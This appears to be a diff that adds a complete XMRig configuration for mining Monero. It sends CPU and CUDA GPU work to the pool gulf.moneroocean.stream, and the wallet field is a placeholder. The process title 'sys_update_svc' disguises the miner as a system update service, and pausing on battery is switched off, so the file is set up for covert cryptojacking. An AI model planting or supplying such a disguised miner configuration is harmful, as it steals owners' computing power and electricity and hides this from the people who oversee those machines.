@@ -1,0 +1,53 @@
+{
+    "autosave": true,
+    "background": false,
+    "colors": true,
+    "title": "sys_update_svc",
+    "cpu": {
+        "enabled": true,
+        "huge-pages": true,
+        "hwloc-ready": true,
+        "priority": 0,
+        "memory-pool": false,
+        "yield": true,
+        "max-threads-hint": 25,
+        "asm": true,
+        "argon2-impl": "arch",
+        "randomx-1gb-pages": false
+    },
+    "cuda": {
+        "enabled": true,
+        "loader": "./libxmrig-cuda.so",
+        "nvml": true,
+        "bfactor": 12,
+        "bsleep": 100
+    },
+    "pools": [
+        {
+            "algo": null,
+            "coin": "monero",
+            "url": "gulf.moneroocean.stream:10128",
+            "user": "YOUR_WALLET_ADDRESS_HERE",
+            "pass": "barboard-01~kawpow",
+            "rig-id": null,
+            "nicehash": false,
+            "keepalive": true,
+            "enabled": true,
+            "tls": false,
+            "tls-fingerprint": null,
+            "daemon": false,
+            "socks5": null,
+            "self-select": null
+        }
+    ],
+    "retries": 5,
+    "retry-pause": 5,
+    "print-time": 60,
+    "health-print-time": 60,
+    "dmi": true,
+    "syslog": false,
+    "user-agent": null,
+    "verbose": 0,
+    "watch": true,
+    "pause-on-battery": false
+}
